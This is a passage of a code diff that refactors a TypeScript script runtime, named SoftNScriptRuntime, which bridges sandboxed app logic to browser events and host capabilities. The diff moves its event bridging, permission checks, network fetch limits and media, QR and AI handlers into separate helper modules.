         console.error(`[SoftN] Error syncing state after ${name}:`, syncError);
@@ -1727,7 +1291,6 @@ export class SoftNScriptRuntime {
   private readonly documentShellRequest: DocumentShellRequest | null;
   /** The page has handlers written for a browser: see ScriptRuntimeOptions.browserHandlers. */
   private readonly browserHandlers: boolean;
-  private readonly assetResolver: ((path: string) => string) | null;
   private documentShell: DocumentShell | null = null;
   private documentShellOn = false;
 
@@ -1771,14 +1334,14 @@ export class SoftNScriptRuntime {
 
   /**
    * Run the engine for something that happened on the page, the way a
-   * listener the logic put on the window is run (bridgeEventListeners): the
+   * listener the logic put on the window is run (dispatchWindowEvent): the
    * page's state in, the call, then what changed back out to the page. Said
    * and returned as nothing when it fails, as a listener's failure is.
    */
   private enterForDocument(name: string, args: unknown[]): unknown {
     if (!this.vmEngine || this.disposed || this.vmEngine.terminated) return 0;
     this.syncReactStateToVM();
-    this.syncWindowToVM();
+    this.windowBridge.toVM();
     this.settleComputedIfStale();
     let result: unknown = 0;
     try {
@@ -1789,9 +1352,9 @@ export class SoftNScriptRuntime {
     this.computedMayHaveMoved();
     this.syncCallCache.clear();
     this.syncVMStateToReact();
-    this.syncWindowFromVM();
-    this.discoverWindowSyncKeys();
-    this.bridgeEventListeners();
+    this.windowBridge.fromVM();
+    this.windowBridge.discoverSyncKeys();
+    this.windowBridge.listen();
     const pending = this.vmEngine.drainPendingHostCalls();
     if (pending.length > 0) void this.processPendingHostCallsUnlocked(pending);
     return result;
@@ -2207,122 +1770,57 @@ export class SoftNScriptRuntime {
   }
 
   /**
-   * Discover and bridge VM event listeners to real browser event listeners.
-   * Called after every async VM function call so listeners registered in _init()
-   * or any other function are automatically bridged.
-   *
-   * The mapping is fully dynamic — the runtime does not hardcode any key bindings.
-   * The .logic code registers handlers (e.g. window.addEventListener("keydown", fn)),
-   * and this method bridges those to real browser events.
+   * Run an event the page's window heard into the listeners the logic put
+   * on its window (see WindowBridge.listen): the page's state in, the
+   * listeners, then what they changed back out to the page.
    */
-  private bridgeEventListeners(): void {
-    if (!this.vmEngine || typeof window === 'undefined') return;
+  private dispatchWindowEvent(eventType: string, eventObj: Record<string, unknown>, isThrottled: boolean): void {
+    if (!this.vmEngine) return;
 
-    const types = this.vmEngine.getEventListenerTypes();
-    for (const eventType of types) {
-      if (this.bridgedEventTypes.has(eventType)) continue;
-      this.bridgedEventTypes.add(eventType);
-
-      // Pointer movement, scrolling, resizing and the wheel arrive several
-      // times a frame; they cross the bridge at most once a frame, combined
-      // by a policy the event type chooses — see event-coalescer.ts. Ordering
-      // is preserved: nothing is delivered ahead of a sample already waiting.
-      const policy = coalescePolicyFor(eventType);
-      const isThrottled = policy !== null;
-
-      const dispatch = (eventObj: Record<string, unknown>) => {
-        if (!this.vmEngine) return;
-
-        // Sync React state → VM before dispatch
-        this.syncReactStateToVM();
-        // Skip window sync for throttled events — mouse/scroll handlers
-        // rarely need window properties, and this saves ~2 WASM crossings/frame.
-        if (!isThrottled) {
-          this.syncWindowToVM();
-        }
-
-        // Dispatch to VM handlers (runs synchronously in WASM)
-        this.settleComputedIfStale();
-        try {
-          this.vmEngine.dispatchEvent(eventType, eventObj);
-        } catch (error) {
-          // Said as a handler's failure is, and the app goes on, with what
-          // the listener changed before it threw. It used to leave the
-          // browser's own listener as an uncaught error that named no part of
-          // the app, and skip the drawing below.
-          console.error(`[SoftN] Error in a ${eventType} listener the logic put on the window:`, error);
-        }
-        this.computedMayHaveMoved();
-        // And what a function answered the page from. An answer is kept for
-        // the rest of a drawing, and let go by a call of the script's or by
-        // two milliseconds passing; a listener is neither, so a page drawn
-        // again straight after a key was answered from before the key.
-        this.syncCallCache.clear();
-
-        // Sync VM state → React after dispatch
-        this.syncVMStateToReact();
-        if (!isThrottled) {
-          this.syncWindowFromVM();
-          // Discover new __ window properties set by the handler.
-          // Deferred for throttled events since they rarely add new sync keys.
-          this.discoverWindowSyncKeys();
-        }
-
-        // A handler that called `softn.*` queued a host call the engine is
-        // holding until someone drains it. `callFunction` drains after every
-        // call and the worker runtime drains after every dispatch, but this
-        // path drained nothing, so a `softn.audio.play` from a keydown
-        // handler sat in the queue until the next function call happened to
-        // release it. Not awaited: the handler has returned and the browser
-        // event is over; the calls resolve into the VM as they complete.
-        const pending = this.vmEngine.drainPendingHostCalls();
-        if (pending.length > 0) void this.processPendingHostCallsUnlocked(pending);
-      };
-
-      let listener: (event: Event) => void;
-      if (policy !== null) {
-        const coalescer = new EventCoalescer(policy, dispatch);
-        this.eventCoalescers.push(coalescer);
-        listener = (event: Event) => {
-          if (!this.vmEngine || !appHears(this, event)) return;
-          coalescer.push(extractEventProps(event));
-        };
-      } else {
-        listener = (event: Event) => {
-          // Only what is aimed at this app: see key-capture.ts.
-          if (!this.vmEngine || !appHears(this, event)) return;
-          // A key the script asked to keep whole: the browser's default is
-          // cancelled here, since the handler runs too late to do it.
-          if (shouldCaptureKey(event, this)) event.preventDefault();
-          dispatch(extractEventProps(event));
-        };
-      }
-
-      window.addEventListener(eventType, listener);
-      if (!this.nativeListeners.has(eventType)) {
-        this.nativeListeners.set(eventType, []);
-      }
-      this.nativeListeners.get(eventType)!.push(listener);
+    // Sync React state → VM before dispatch
+    this.syncReactStateToVM();
+    // Skip window sync for throttled events — mouse/scroll handlers
+    // rarely need window properties, and this saves ~2 WASM crossings/frame.
+    if (!isThrottled) {
+      this.windowBridge.toVM();
     }
-  }
 
-  /**
-   * Discover __ prefixed properties on the VM's window object and register
-   * them as sync keys. This makes window property sync fully dynamic — the
-   * .logic code sets any window.__xxx property and it gets synced automatically.
-   */
-  private discoverWindowSyncKeys(): void {
-    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
-
-    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
-    if (!vmWindow || typeof vmWindow !== 'object') return;
-
-    for (const key of Object.keys(vmWindow as Record<string, unknown>)) {
-      if (key.startsWith('__') && !this.syncKeys.has(key)) {
-        this.syncKeys.add(key);
-        this.windowSyncActive = true;
-      }
+    // Dispatch to VM handlers (runs synchronously in WASM)
+    this.settleComputedIfStale();
+    try {
+      this.vmEngine.dispatchEvent(eventType, eventObj);
+    } catch (error) {
+      // Said as a handler's failure is, and the app goes on, with what
+      // the listener changed before it threw. It used to leave the
+      // browser's own listener as an uncaught error that named no part of
+      // the app, and skip the drawing below.
+      console.error(`[SoftN] Error in a ${eventType} listener the logic put on the window:`, error);
     }
+    this.computedMayHaveMoved();
+    // And what a function answered the page from. An answer is kept for
+    // the rest of a drawing, and let go by a call of the script's or by
+    // two milliseconds passing; a listener is neither, so a page drawn
+    // again straight after a key was answered from before the key.
+    this.syncCallCache.clear();
+
+    // Sync VM state → React after dispatch
+    this.syncVMStateToReact();
+    if (!isThrottled) {
+      this.windowBridge.fromVM();
+      // Discover new __ window properties set by the handler.
+      // Deferred for throttled events since they rarely add new sync keys.
+      this.windowBridge.discoverSyncKeys();
+    }
+
+    // A handler that called `softn.*` queued a host call the engine is
+    // holding until someone drains it. `callFunction` drains after every
+    // call and the worker runtime drains after every dispatch, but this
+    // path drained nothing, so a `softn.audio.play` from a keydown
+    // handler sat in the queue until the next function call happened to
+    // release it. Not awaited: the handler has returned and the browser
+    // event is over; the calls resolve into the VM as they complete.
+    const pending = this.vmEngine.drainPendingHostCalls();
+    if (pending.length > 0) void this.processPendingHostCallsUnlocked(pending);
   }
 
   /**
@@ -2336,20 +1834,9 @@ export class SoftNScriptRuntime {
     // from being executed into an engine nobody will ever dispose.
     this.disposed = true;
 
-    // Clean up native event listeners
-    if (typeof window !== 'undefined') {
-      for (const [eventName, listeners] of this.nativeListeners.entries()) {
-        for (const listener of listeners) {
-          window.removeEventListener(eventName, listener);
-        }
-      }
-    }
-    this.nativeListeners.clear();
-    this.bridgedEventTypes.clear();
-    // A frame already requested must not fire into a disposed engine, and
-    // neither may a timer the script set.
-    for (const coalescer of this.eventCoalescers) coalescer.dispose();
-    this.eventCoalescers = [];
+    // The window's listeners, and the app's own `window.__…` values.
+    this.windowBridge.dispose();
+    // Nor may a timer the script set fire into a disposed engine.
     this.timers.dispose();
     this.dueTimers = [];
     if (this.loadEntry !== null) {
@@ -2362,55 +1849,30 @@ export class SoftNScriptRuntime {
     this.externalFunctionNames = [];
     this.externalFunctionValues = [];
     this.externalValuesGlobalIndex = -1;
-    this.syncKeys.clear();
-    this.windowSyncSeen.clear();
-    this.windowSyncActive = false;
-    // The app's latches go with the app. Left behind, the next runtime on
-    // this page — a reload of the same bundle — would snapshot them as the
-    // host's and refuse to write them, and pointer lock would never engage.
-    if (typeof window !== 'undefined') {
-      const realWin = window as unknown as Record<string, unknown>;
-      for (const key of this.windowKeysWritten) {
-        if (this.hostWindowKeys.has(key)) continue;
-        try {
-          delete realWin[key];
-        } catch {
-          // A non-configurable property is not this runtime's to remove.
-        }
-      }
-    }
-    this.windowKeysWritten.clear();
 
     // Silence. A looping track has no reason to stop on its own, so closing
     // the tab on an app playing music would otherwise leave it playing for
     // the rest of the session with nothing on screen to stop it.
-    this.stopAllAudio();
+    this.audio.silence();
     this.localSpeech?.dispose();
     this.localSpeech = null;
 
     // And stop listening. A microphone left open outlives the app that opened
     // it: the tracks stay live, the OS recording indicator stays lit, and
     // nothing on screen explains why.
-    this.stopMicrophone();
+    this.microphone.close();
 
     // Image decoding has no native AbortSignal. Explicitly settle any pending
     // load so a malformed image cannot keep an orphaned host call alive.
-    for (const cancel of this.qrDecodeCancelers) cancel();
-    this.qrDecodeCancelers.clear();
+    this.qr.dispose();
 
     // An app that has been closed no longer owns background network work.
     // Abort pending fetches so they cannot continue downloading into an
     // orphaned host-call continuation.
-    for (const controller of this.netAbortControllers) controller.abort();
-    this.netAbortControllers.clear();
+    this.network.dispose();
 
     // Release AI resources: each loaded model's Worker is terminated.
-    this.modelHost?.dispose();
-    this.modelHost = null;
-    if (this.gpuComputeManager) {
-      this.gpuComputeManager.releaseAll().catch(() => {});
-      this.gpuComputeManager = null;
-    }
+    this.ai.dispose();
 
     // Dispose WASM engine
     if (this.vmEngine) {
@@ -2419,207 +1881,11 @@ export class SoftNScriptRuntime {
     }
   }
 
-  // ========================================================================
-  // Import resolution
-  // ========================================================================
-
-  /**
-   * Resolve import statements in .logic code by inlining imported files.
-   * Handles `import "./path.logic"` statements by fetching the imported code
-   * via the importResolver and recursively resolving nested imports.
-   */
-  private async resolveImports(
-    code: string,
-    expanding: Set<string>,
-    currentPath?: string
-  ): Promise<string> {
-    if (!this.importResolver) return code;
-
-    // Match import statements: import "./path.logic" or import './path.logic'
-    const importRegex = /^\s*import\s+["']([^"']+)["']\s*;?\s*$/gm;
-    const parts: string[] = [];
-    let lastIndex = 0;
-    let match;
-
-    while ((match = importRegex.exec(code)) !== null) {
-      // Add code before this import
-      parts.push(code.slice(lastIndex, match.index));
-
-      const importPath = match[1];
-      const resolvedPath = this.resolveImportPath(importPath, currentPath);
-
-      // A file already in this compilation is included once, not twice: the
-      // result is a single translation unit, and re-inlining a file would
-      // redeclare every class and variable in it — a SyntaxError to the VM.
-      // Two files importing a common third is normal, so this is a skip.
-      if (this.includedLogicPaths.has(resolvedPath)) {
-        parts.push(`/* already included: ${importPath} */`);
-      } else if (expanding.has(resolvedPath)) {
-        // Still being expanded further up the chain, so it genuinely cycles.
-        throw new Error(
-          `Circular import detected: "${resolvedPath}" is already in the import chain: ${[...expanding].join(' → ')} → ${resolvedPath}`
-        );
-      } else {
-        expanding.add(resolvedPath);
-        this.includedLogicPaths.add(resolvedPath);
-        try {
-          const source = await this.importResolver(resolvedPath);
-          if (source != null) {
-            // Recursively resolve imports in the imported code
-            const resolved = await this.resolveImports(moduleSyntaxAsScript(source), expanding, resolvedPath);
-            parts.push(resolved);
-          } else {
-            parts.push(`/* import not found: ${importPath} */`);
-          }
-        } catch (e) {
-          console.error(`[SoftN] Error resolving import "${importPath}":`, e);
-          parts.push(`/* import error: ${importPath} */`);
-        } finally {
-          // Off the ancestor chain — it stays in includedLogicPaths, so a
-          // later sibling import of the same file skips rather than throws.
-          expanding.delete(resolvedPath);
-        }
-      }
-
-      lastIndex = match.index + match[0].length;
-    }
-
-    // Add remaining code after last import
-    parts.push(code.slice(lastIndex));
-    return parts.join('\n');
-  }
-
-  /**
-   * Resolve a relative import path against the current file's directory.
-   */
-  private resolveImportPath(importPath: string, currentPath?: string): string {
-    // Absolute paths, URLs — return as-is
-    if (
-      importPath.startsWith('http://') ||
-      importPath.startsWith('https://') ||
-      importPath.startsWith('/')
-    ) {
-      return importPath;
-    }
-    // Not relative — return as-is
-    if (!importPath.startsWith('./') && !importPath.startsWith('../')) {
-      return importPath;
-    }
-    // No base path — return as-is
-    if (!currentPath) {
-      return importPath;
-    }
-    // Resolve relative to current file's directory
-    const baseParts = currentPath.split('/');
-    baseParts.pop(); // remove filename to get directory
-    const importParts = importPath.split('/');
-    for (const part of importParts) {
-      if (part === '.') continue;
-      if (part === '..') {
-        baseParts.pop();
-      } else {
-        baseParts.push(part);
-      }
-    }
-    return baseParts.join('/');
-  }
-
-  // ========================================================================
-  // Window/Navigator sync (simplified for WASM)
-  // ========================================================================
-
   /**
    * Register a __ window property key for syncing from real window → VM.
    */
   registerSyncKey(key: string): void {
-    if (key.startsWith('__')) {
-      this.syncKeys.add(key);
-    }
-  }
-
-  /** What each synced window global held when it was last handed to the VM. */
-  private windowSyncSeen = new Map<string, unknown>();
-
-  /**
-   * Sync properties from the real browser `window` into the VM's `window` global.
-   * Only syncs __ prefixed keys registered via registerSyncKey().
-   * Short-circuits when no sync keys have values on the real window.
-   */
-  private syncWindowToVM(): void {
-    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
-    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;
-
-    // Quick check: are any syncKeys actually set on the real window?
-    const realWin = window as unknown as Record<string, unknown>;
-    if (!this.windowSyncActive) {
-      // Periodically recheck (cheap: just test 2 keys)
-      for (const key of this.syncKeys) {
-        if (realWin[key] !== undefined) {
-          this.windowSyncActive = true;
-          break;
-        }
-      }
-      if (!this.windowSyncActive) return;
-    }
-
-    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
-    if (!vmWindow || typeof vmWindow !== 'object') return;
-
-    const updated: Record<string, unknown> = { ...(vmWindow as Record<string, unknown>) };
-    let changed = false;
-
-    for (const key of this.syncKeys) {
-      const value = realWin[key];
-      if (value !== undefined && typeof value !== 'function') {
-        updated[key] = value;
-        // Remembered so the write-back can tell a value the script changed
-        // from one it merely received.
-        this.windowSyncSeen.set(key, value);
-        changed = true;
-      }
-    }
-
-    if (changed) {
-      this.vmEngine.setGlobal(this.windowGlobalIndex, updated);
-    }
-  }
-
-  /**
-   * Sync properties from the VM's `window` global back to the real browser `window`.
-   * Only syncs keys registered via registerSyncKey().
-   */
-  private syncWindowFromVM(): void {
-    if (!this.windowSyncActive) return;
-    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
-    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;
-
-    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
-    if (!vmWindow || typeof vmWindow !== 'object') return;
-
-    const realWin = window as unknown as Record<string, unknown>;
-    const vmWinObj = vmWindow as Record<string, unknown>;
-
-    for (const key of this.syncKeys) {
-      const value = vmWinObj[key];
-      if (value === undefined) continue;
-      // The host's own globals are read-only from in here — see hostWindowKeys.
-      // A function is the host's as well whatever its name: the VM never
-      // receives one (syncWindowToVM skips them), so it cannot be handing one
-      // back, only replacing it.
-      if (this.hostWindowKeys.has(key) || typeof realWin[key] === 'function') continue;
-      // Nor names the host, its frameworks or SoftN itself may give a value
-      // later: `__TAURI__` written from here made every app opened after it
-      // take the page for the desktop runtime, and fail to open its storage.
-      if (HOST_WINDOW_NAME.test(key)) continue;
-      // A value the script did not touch is not written back. The browser
-      // may have moved it since the call began — a pointer-locked camera
-      // writes __scene3dYaw on every mouse move — and echoing the copy the
-      // VM was handed would throw that movement away.
-      if (this.windowSyncSeen.has(key) && Object.is(this.windowSyncSeen.get(key), value)) continue;
-      realWin[key] = value;
-      this.windowKeysWritten.add(key);
-      this.windowSyncSeen.set(key, value);
-    }
+    this.windowBridge.registerSyncKey(key);
   }
 
   // ── Host call processing (softn.* bridge) ───────────────────────────
@@ -2761,11 +2027,11 @@ export class SoftNScriptRuntime {
       case 'net.fetch': {
         // A host that supplied a handler has taken this capability over: the
         // request is its to make or refuse, and the permission check and host
-        // allowlist in `handleNetFetch` belong to the browser `fetch` the
+        // allowlist in `AppNetwork.fetch` belong to the browser `fetch` the
         // handler is standing in for. The script's options object is parsed
         // here rather than passed on as text so the handler sees what the
         // browser path sees.
-        if (!this.netFetchHandler) return this.handleNetFetch(call);
+        if (!this.netFetchHandler) return this.network.fetch(call);
         const [url, optionsJson] = call.args;
         let options: Record<string, unknown> = {};
         try {
@@ -2776,9 +2042,9 @@ export class SoftNScriptRuntime {
         return this.netFetchHandler(url, options);
       }
       case 'qr.encode':
-        return this.handleQrEncode(call);
+        return this.qr.encode(call);
       case 'qr.decode':
-        return this.handleQrDecode(call);
+        return this.qr.decode(call);
       case 'camera.capturePhoto':
         return this.handleCameraCapture(call);
       case 'camera.recordVideo':
@@ -2788,21 +2054,21 @@ export class SoftNScriptRuntime {
       case 'camera.stopLive':
         return this.handleCameraStopLive();
       case 'mic.record':
-        return this.handleMicRecord(call);
+        return this.microphone.record(call);
       case 'mic.stop':
-        return this.handleMicStop();
+        return this.microphone.stop();
       case 'mic.isRecording':
-        return this.handleMicIsRecording();
+        return this.microphone.isRecording();
       case 'audio.play':
-        return this.handleAudioPlay(call);
+        return this.audio.play(call);
       case 'audio.stop':
-        return this.handleAudioStop(call);
+        return this.audio.stop(call);
       case 'audio.stopAll':
-        return this.handleAudioStopAll();
+        return this.audio.stopAll();
       case 'audio.setVolume':
-        return this.handleAudioSetVolume(call);
+        return this.audio.setVolume(call);
       case 'audio.whenEnded':
-        return this.handleAudioWhenEnded(call);
+        return this.audio.whenEnded(call);
       case 'audio.speechCapabilities':
       case 'audio.loadSpeechModel':
       case 'audio.releaseSpeechModel':
@@ -2814,26 +2080,20 @@ export class SoftNScriptRuntime {
       case 'sandbox.run':
         this.sandboxHost ??= new SandboxHost();
         return this.sandboxHost.run(call.args[0],call.args[1]);
-      case 'files.readZipText': {
-        this.checkPermission('files');
-        const file=getFileByRef(call.args[0]);
-        if(!file||file.size>262144)throw Error('Choose a ZIP smaller than 256 KiB');
-        const bytes=new Uint8Array(await file.arrayBuffer());
-        const files=readZipText(bytes);
-        return {files,hash:await sha256Hex(bytes)};
-      }
+      case 'files.readZipText':
+        return readZipText(this.gate, call);
       case 'files.pickFile':
-        return this.handleFilesPickFile(call);
+        return pickFile(this.gate, call);
       case 'files.readText':
-        return this.handleFilesReadText(call);
+        return readText(this.gate, call);
       case 'files.readBase64':
-        return this.handleFilesReadBase64(call);
+        return readBase64(this.gate, call);
       case 'files.saveFile':
-        return this.handleFilesSaveFile(call);
+        return saveFile(this.gate, call);
       case 'input.captureKeys':
         return this.handleInputCaptureKeys(call);
       case 'ai.getCapabilities':
-        return this.handleAIGetCapabilities();
+        return this.ai.capabilities();
       case 'ai.onnx.loadModel':
       case 'ai.onnx.run':
       case 'ai.onnx.release':
@@ -2848,38 +2108,37 @@ export class SoftNScriptRuntime {
         this.checkPermission('ai');
         throw new Error(`softn.${call.kind} was removed: local models now run on ZIPP, as GGUF chat models through softn.ai.model.load and softn.ai.model.generate`);
       case 'ai.releaseAll':
-        return this.handleAIReleaseAll();
+        return this.ai.releaseAll();
       case 'ai.model.load':
-        return this.handleAIModelLoad(call);
+        return this.ai.load(call);
       case 'ai.model.generate':
-        return this.handleAIModelGenerate(call);
+        return this.ai.generate(call);
       case 'ai.model.cancel':
-        this.checkPermission('ai');
-        return { cancelled: this.modelHost?.cancel(String(call.args[0] ?? '')) ?? false };
+        return this.ai.cancel(call);
       case 'ai.model.release':
-        return this.handleAIModelRelease(call);
+        return this.ai.release(call);
       case 'ai.gpu.requestDevice':
-        return this.handleGpuRequestDevice(call);
+        return this.ai.gpuRequestDevice(call);
       case 'ai.gpu.createBuffer':
-        return this.handleGpuCreateBuffer(call);
+        return this.ai.gpuCreateBuffer(call);
       case 'ai.gpu.writeBuffer':
-        return this.handleGpuWriteBuffer(call);
+        return this.ai.gpuWriteBuffer(call);
       case 'ai.gpu.createShader':
-        return this.handleGpuCreateShader(call);
+        return this.ai.gpuCreateShader(call);
       case 'ai.gpu.createPipeline':
-        return this.handleGpuCreatePipeline(call);
+        return this.ai.gpuCreatePipeline(call);
       case 'ai.gpu.dispatch':
-        return this.handleGpuDispatch(call);
+        return this.ai.gpuDispatch(call);
       case 'ai.gpu.readBuffer':
-        return this.handleGpuReadBuffer(call);
+        return this.ai.gpuReadBuffer(call);
       case 'ai.gpu.release':
-        return this.handleGpuRelease(call);
+        return this.ai.gpuRelease(call);
       case 'ai.gpu.releaseAll':
-        return this.handleGpuReleaseAll();
+        return this.ai.gpuReleaseAll();
       case 'storage.op':
-        return this.handleStorageOp(call);
+        return this.network.storage(call);
       case 'bundle.read':
-        return this.handleBundleRead(call);
+        return this.network.readFile(call);
       case 'dialog.alert': {
         // A page's alert(), shown when its turn is over: nothing waits on it.
         //
@@ -2906,80 +2165,7 @@ export class SoftNScriptRuntime {
   // ── Permission checks ──
 
   private checkPermission(capability: string): void {
-    if (!this.permissionConfig) {
-      // No permission.json means no capabilities. This used to allow everything
-      // "for backward compatibility", which inverted the whole model: a bundle
-      // that declared nothing got the network, the camera, the filesystem, AI
-      // and the GPU with no prompt, while an honest bundle that declared what it
-      // needed got a consent dialog the user could refuse. Declaring less bought
-      // more. The user is never asked, because there is nothing to ask about —
-      // the bundle claimed to need nothing.
-      throw new Error(
-        `${capability} access not permitted: this bundle ships no permission.json. ` +
-          `Declare the capabilities it needs — { "permissions": { "${capability}": { "enabled": true } } } — ` +
-          `so the user can see and approve them.`
-      );
-    }
-    if (this.permissionConfig.consentPending) {
-      // Running with everything withheld until the user answers the consent
-      // bar. Deny like any other missing capability, but say why: the bundle
-      // did declare this, so telling the author to declare it is a lie the
-      // user cannot act on.
-      throw new Error(
-        `${capability} access not permitted yet: this app has asked for it and you have not allowed it. ` +
-          `Choose Allow in the permission bar at the top of the app to grant it.`
-      );
-    }
-    // Permission config IS set — deny by default for any capability not
-    // explicitly enabled. Explicitly means the boolean true: a declaration
-    // spelt "enabled": "true" or 1 is what inspectDeclaration reports as
-    // malformed and the consent bar requests nothing for, so a truthiness
-    // check here ran the app with a capability nobody was asked about.
-    const perms = this.permissionConfig.permissions;
-    switch (capability) {
-      case 'net':
-        if (perms.net?.enabled !== true)
-          throw new Error('Network access not permitted. Add net.enabled to permission.json');
-        break;
-      case 'camera':
-        if (perms.camera?.enabled !== true)
-          throw new Error('Camera access not permitted. Add camera.enabled to permission.json');
-        break;
-      case 'mic':
-        if (perms.mic?.enabled !== true)
-          throw new Error('Microphone access not permitted. Add mic.enabled to permission.json');
-        break;
-      case 'files':
-        if (perms.files?.enabled !== true)
-          throw new Error('File access not permitted. Add files.enabled to permission.json');
-        break;
-      case 'qr':
-        if (perms.qr?.enabled !== true)
-          throw new Error('QR access not permitted. Add qr.enabled to permission.json');
-        break;
-      case 'ai':
-        if (perms.ai?.enabled !== true)
-          throw new Error('AI access not permitted. Add ai.enabled to permission.json');
-        break;
-      case 'gpu':
-        if (perms.gpu?.enabled !== true)
-          throw new Error('GPU compute access not permitted. Add gpu.enabled to permission.json');
-        break;
-      case 'sync':
-        if (perms.sync?.enabled !== true)
-          throw new Error('Sync not permitted. Add sync.enabled to permission.json');
-        break;
-      case 'storage':
-        if (perms.storage?.enabled !== true)
-          throw new Error('Server storage not permitted. Add storage.enabled to permission.json');
-        break;
-      case 'accel':
-        if (perms.accel?.enabled !== true)
-          throw new Error('Host acceleration not permitted. Add accel.enabled to permission.json');
-        break;
-      default:
-        throw new Error(`Unknown capability: ${capability}. Add it to permission.json`);
-    }
+    requirePermission(this.permissionConfig, capability);
   }
 
   /**
@@ -2989,154 +2175,7 @@ export class SoftNScriptRuntime {
    * only by `softn.net.fetch`.
    */
   private checkNetHost(url: string): void {
-    const verdict = describeNetDestination(url, this.permissionConfig?.permissions.net);
-    if (!verdict.allowed) throw new Error(verdict.reason);
-  }
-
-  // ── Host call handlers ──
-
-  private async handleNetFetch(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('net');
-    const [url, optionsJson] = call.args;
-    this.checkNetHost(url);
-    const options = optionsJson ? JSON.parse(optionsJson) : {};
-
-    // Disable redirects to prevent allowlist bypass: a redirect from an
-    // allowed host to an internal/disallowed host would skip checkNetHost.
-    const requestedTimeout = Number(options.timeout);
-    const timeoutMs = Number.isFinite(requestedTimeout)
-      ? Math.max(1, Math.min(60_000, requestedTimeout))
-      : 15_000;
-    const abortController = new AbortController();
-    const timeout = setTimeout(() => abortController.abort(), timeoutMs);
-    this.netAbortControllers.add(abortController);
-
-    try {
-      const resp = await fetch(url, {
-        method: options.method || 'GET',
-        headers: options.headers,
-        // The bridge serialises the whole options object once, so a string
-        // body arrives here as the string the script wrote; encoding it again
-        // sent `"a=1"` as `"\"a=1\""` and no form or text endpoint could read
-        // it. An object body is what the second encoding was for.
-        body:
-          typeof options.body === 'string'
-            ? options.body || undefined
-            : options.body
-              ? JSON.stringify(options.body)
-              : undefined,
-        signal: abortController.signal,
-        redirect: 'error',
-        // The app's request, not the host's: no cookie or login of the page
-        // it is drawn in goes with it, and the server is not told that page's
-        // address. An app that signs in says so itself (an Authorization
-        // header), or asks the host's backend (`softn.backend`).
-        credentials: 'omit',
-        referrerPolicy: 'no-referrer',
-      });
-
-      const declaredHeader = resp.headers.get('content-length');
-      const declaredLength = declaredHeader === null ? NaN : Number(declaredHeader);
-      if (
-        Number.isFinite(declaredLength) &&
-        declaredLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES
-      ) {
-        try {
-          await resp.body?.cancel();
-        } catch {
-          // Preserve the response-size error if the stream was disturbed.
-        }
-        throw new Error('Network response is too large');
-      }
-
-      let body: string;
-      if (resp.body) {
-        const reader = resp.body.getReader();
-        const decoder = new TextDecoder();
-        const textChunks: string[] = [];
-        let total = 0;
-        try {
-          let next = await reader.read();
-          while (!next.done) {
-            if (next.value) {
-              total += next.value.byteLength;
-              if (total > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
-                try {
-                  await reader.cancel();
-                } catch {
-                  // Preserve the response-size error if cancellation fails.
-                }
-                throw new Error('Network response is too large');
-              }
-              textChunks.push(decoder.decode(next.value, { stream: true }));
-            }
-            next = await reader.read();
-          }
-          textChunks.push(decoder.decode());
-        } finally {
-          reader.releaseLock();
-        }
-        body = textChunks.join('');
-      } else {
-        const bytes = await resp.arrayBuffer();
-        if (bytes.byteLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
-          throw new Error('Network response is too large');
-        }
-        body = new TextDecoder().decode(bytes);
-      }
-
-      return {
-        ok: resp.ok,
-        status: resp.status,
-        statusText: resp.statusText,
-        body,
-        headers: Object.fromEntries(resp.headers),
-      };
-    } finally {
-      clearTimeout(timeout);
-      this.netAbortControllers.delete(abortController);
-    }
-  }
-
-  /**
-   * A page's `fetch('data.json')`: the app's own file, read where its
-   * markup's `src` would find it, with no network and no permission, as an
-   * image of its is. A bundle's file is a `blob:` address; a site's (page
-   * mode) a path in the page's own folder. Anything else is not one of the
-   * app's files, and is not found.
-   */
-  private async handleBundleRead(call: PendingHostCall): Promise<unknown> {
-    const notFound = { ok: false, status: 404, statusText: 'Not Found', body: '', headers: {} };
-    const path = String(call.args[0] ?? '').replace(/[?#].*$/, '').replace(/^\.\//, '');
-    const url = path && this.assetResolver ? this.assetResolver(path) : '';
-    if (!url || (!/^blob:/i.test(url) && /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i.test(url))) return notFound;
-    try {
-      const resp = await fetch(url, { redirect: 'error' });
-      if (!resp.ok) return { ...notFound, status: resp.status, statusText: resp.statusText };
-      const body = await resp.text();
-      if (body.length > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) throw new Error('The file is too large');
-      const type = resp.headers.get('content-type');
-      return { ok: true, status: 200, statusText: 'OK', body, headers: type ? { 'content-type': type } : {} };
-    } catch (error) {
-      return { error: error instanceof Error ? error.message : 'The file could not be read' };
-    }
-  }
-
-  /**
-   * One of the app's own files as a Blob, for a model it ships: from the
-   * bundle provider a host supplied, else where the app's markup would find
-   * it (the `fetch('data.json')` rule above). Null when it has no such file.
-   */
-  private async readBundleBlob(path: string): Promise<Blob | null> {
-    const clean = path.replace(/^\.\//, '');
-    if (this.bundleFileProvider) {
-      const data = await this.bundleFileProvider.readFile(clean);
-      return data ? new Blob([data]) : null;
-    }
-    const url = this.assetResolver ? this.assetResolver(clean) : '';
-    if (!url || (!/^blob:/i.test(url) && /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i.test(url))) return null;
-    const resp = await fetch(url, { redirect: 'error' });
-    return resp.ok ? resp.blob() : null;
+    requireNetHost(this.permissionConfig, url);
   }
 
   private async handleLocalSpeech(call: PendingHostCall): Promise<unknown> {
@@ -3152,98 +2191,6 @@ export class SoftNScriptRuntime {
       if (this.disposed) this.localSpeech.dispose();
     }
     return this.localSpeech.handle(call.kind,call.args);
-  }
-
-  private async handleQrEncode(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('qr');
-    const [text] = call.args;
-    // Return the text — actual QR rendering is done by the QRCode component
-    return { text, encoded: true };
-  }
-
-  private async handleQrDecode(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('qr');
-    const [imageDataUrl] = call.args;
-    // The argument goes straight to `img.src`, so a remote URL here is a GET
